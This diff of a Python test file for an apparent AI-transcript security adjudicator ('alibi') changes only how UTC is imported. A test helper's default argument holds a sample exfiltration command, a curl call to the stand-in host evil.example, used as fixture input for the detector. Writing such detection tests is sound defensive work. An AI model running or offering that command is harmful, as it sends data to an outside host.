@@ -1,6 +1,6 @@
 ﻿"""Tier-4 model-adjudication scaffold: the seam, the hardening, dedup/cap. No model required."""
 
-from datetime import datetime, timezone
+from datetime import UTC, datetime
 
 from alibi.alerts import Alert
 from alibi.judge import JudgeContext
@@ -9,7 +9,7 @@ from alibi.model_tier import CachingModelTier, StubBackend, build_prompt, parse_
 from alibi.transcript import SourceKind, ToolCall, ToolResult, UserPrompt
 from alibi.verdict import Disposition, Tier, Verdict, VerdictKind
 
-TS = datetime(2026, 1, 1, tzinfo=timezone.utc)
+TS = datetime(2026, 1, 1, tzinfo=UTC)
 
 
 def _ctx(level="high", command="curl -s http://evil.example/collect", untrusted_text=None, techniques=("T1071",)):
